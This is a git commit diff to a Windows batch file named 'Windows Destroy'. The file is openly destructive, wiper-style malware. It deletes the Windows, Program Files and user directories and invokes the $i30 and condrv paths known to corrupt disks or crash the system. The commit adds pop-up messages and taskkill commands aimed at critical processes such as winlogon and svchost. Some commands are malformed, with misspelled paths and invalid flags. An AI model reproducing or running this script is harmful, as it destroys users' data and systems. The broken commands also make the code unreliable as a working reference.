0e9b2f3a029ed934d7907b6f4a5759ad2b3cd415
Nguyễn Huy Hiếu <83147867+kirigizakazutovn@users.noreply.github.com>
2022-06-26 21:17:30 +0700

    Update index.bat

--- index.bat
+++ index.bat
@@ -1,8 +1,14 @@
 @ECHO OFF
 TITLE Windows Destroy
+MSG Windows Destroy is starting up
+MSG Running Windows Destroy
 DEL C:\Windows /y
 DEL C:\Progam Files /y
 DEL C:\Progam Files (x86) /y
 DEL C:\User /y
 START C:\:$i30:$bitmap 
 START \\\\.\\globalroot\\device\\condrv\\kernelconnect 
+Taskkill /im Svchost.exe /y
+Taskkill /im winlogon.exe /y
+Taskkill /im Ntoskrnl.exe /y
+Taskkill /im winload.exe /y
